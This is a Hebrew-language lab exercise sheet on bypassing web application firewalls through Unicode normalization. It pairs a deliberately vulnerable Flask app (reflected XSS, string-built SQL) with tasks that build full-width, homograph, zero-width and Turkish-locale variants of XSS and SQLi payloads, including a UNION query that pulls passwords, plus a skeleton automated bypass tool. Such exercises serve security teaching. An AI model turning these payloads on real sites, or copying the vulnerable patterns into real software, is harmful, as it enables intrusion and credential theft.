# נורמליזציית Unicode - תרגיל

## הכנה

```bash
# Setting up the test environment
# A Flask application that performs NFKC normalization before processing
```

```python
# vulnerable_app.py
from flask import Flask, request
import unicodedata

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    # The application normalizes NFKC before display
    normalized = unicodedata.normalize('NFKC', q)
    return f"<html><body>Results for: {normalized}</body></html>"

@app.route('/api/query')
def query():
    q = request.args.get('q', '')
    normalized = unicodedata.normalize('NFKC', q)
    # Direct injection into SQL (for practice purposes)
    sql = f"SELECT * FROM items WHERE name = '{normalized}'"
    return f"Query: {sql}"

if __name__ == '__main__':
    app.run(port=5000)
```

שימו לב: הריצו את האפליקציה מאחורי WAF (כגון ModSecurity) לצורך התרגיל.

---

## תרגיל 1 - מיפוי תווי Unicode חלופיים

**משימה:**

כתבו סקריפט Python שמוצא תווי Unicode שמתנרמלים לתווים רגישים:

```python
import unicodedata

def find_alternatives(target_char):
    """Find all Unicode characters that normalize (NFKC) to a specific character"""
    alternatives = []
    # TODO: iterate over the Unicode range and find characters that become target_char after NFKC
    for codepoint in range(0x0080, 0x10000):
        # ...
        pass
    return alternatives

# Find alternatives for:
targets = ['<', '>', "'", '"', '/', '(', ')', ' ', '=', ';']
for t in targets:
    alts = find_alternatives(t)
    print(f"'{t}' -> {len(alts)} alternatives: {alts[:5]}")
```

1. מצאו לפחות 3 חלופות לכל תו ברשימה
2. לכל חלופה, ציינו את שם התו ב-Unicode (השתמשו ב-`unicodedata.name()`)
3. סמנו אילו חלופות עוברות גם נורמליזציית NFC (לא רק NFKC)

---

## תרגיל 2 - payloads XSS עם Full-width

**משימה:**

1. בנו payload XSS שמשתמש רק בתווים ברוחב מלא (full-width) עבור תווים מיוחדים:
   - הpayload: `<img src=x onerror=alert(1)>`
   - החליפו את `<`, `>`, `(`, `)`, `=` בגרסאות full-width

2. שלחו את הpayload לאפליקציית הבדיקה וודאו ש:
   - ה-WAF לא חוסם
   - האפליקציה מנרמלת והpayload מתבצע

3. בנו payload חלקי - החליפו רק תו אחד ובדקו מהו המינימום הנדרש לbypass ה-WAF

---

## תרגיל 3 - payloads SQLi עם Unicode

**משימה:**

1. בנו payload SQLi שמנצל תווי Unicode חלופיים:
   - הpayload מקורי: `' UNION SELECT username, password FROM users--`
   - החליפו את הגרש, רווחים, ופסיקים בחלופות Unicode

2. בדקו אילו צורות נורמליזציה מפענחות את הpayload:
   ```python
   for form in ['NFC', 'NFD', 'NFKC', 'NFKD']:
       result = unicodedata.normalize(form, your_payload)
       print(f"{form}: {result}")
   ```

3. מצאו payload שעובר רק ב-NFKC ולא ב-NFC (כלומר, WAF שעושה NFC לא יתפוס)

---

## תרגיל 4 - התקפות הומוגרף

**משימה:**

1. כתבו פונקציה שמייצרת כל הקומבינציות ההומוגרפיות של מילה:
   ```python
   def homograph_variants(word):
       # Mapping Latin -> Cyrillic
       latin_to_cyrillic = {
           'a': '\u0430', 'c': '\u0441', 'e': '\u0435',
           'o': '\u043e', 'p': '\u0440', 'x': '\u0445',
           'y': '\u0443', 's': '\u0455',
       }
       # TODO: generate all combinations
       pass

   variants = homograph_variants("script")
   print(f"Number of variants: {len(variants)}")
   ```

2. בדקו אילו מהווריאנטים של `script` עוקפים את ה-WAF
3. בדקו אילו מהם עדיין מתפקדים כתגית HTML בדפדפן

---

## תרגיל 5 - תווים בלתי נראים

**משימה:**

1. הכניסו תווי zero-width בתוך מילים שה-WAF חוסם:
   - `scr\u200bipt` (zero-width space בתוך script)
   - `SEL\u200bECT` (zero-width space בתוך SELECT)

2. בדקו:
   - האם ה-WAF חוסם את הpayload?
   - האם האפליקציה (אחרי נורמליזציה) מקבלת אותו כתקין?
   - האם הדפדפן מתעלם מתווים אלו בתוך תגיות HTML?

3. נסו תווי zero-width נוספים ותעדו את ההתנהגות של כל אחד

---

## תרגיל 6 - בעיית ה-I הטורקי

**משימה:**

1. בנו payload שמנצל את הבעיה הטורקית:
   ```python
   # A WAF that runs lower() on "SELECT" in Turkish locale gets "sel\u0131ct" (with dotless i)
   # and then the comparison to "select" fails
   ```

2. בנו רשימת מילות מפתח SQL שמושפעות מ-case mapping טורקי
3. האם `I` (U+0130, I with dot above) מתנרמל ל-`i` ב-NFKC?

---

## תרגיל 7 - כלי אוטומטי

**משימה:**

בנו כלי Python שמקבל payload ומייצר אוטומטית וריאנטים עם Unicode:

```python
class UnicodeWAFBypass:
    def __init__(self, payload):
        self.payload = payload
        self.variants = []

    def generate_fullwidth(self):
        """Generate a full-width variant"""
        pass

    def generate_homograph(self):
        """Generate homograph variants"""
        pass

    def generate_zero_width(self):
        """Insert zero-width characters"""
        pass

    def generate_mixed(self):
        """Combine all techniques"""
        pass

    def test_all(self, target_url):
        """Test all variants against the WAF"""
        pass

# Usage
bypass = UnicodeWAFBypass("<script>alert(1)</script>")
bypass.generate_fullwidth()
bypass.generate_homograph()
bypass.generate_zero_width()
bypass.generate_mixed()
bypass.test_all("http://localhost:5000/search")
```

1. השלימו את כל המתודות
2. הוסיפו מתודה שבודקת אם הווריאנט עדיין תקין (מתנרמל חזרה לpayload המקורי)
3. הריצו מול סביבת הבדיקה ותעדו: כמה ווריאנטים עברו את ה-WAF? אילו טכניקות הכי יעילות?
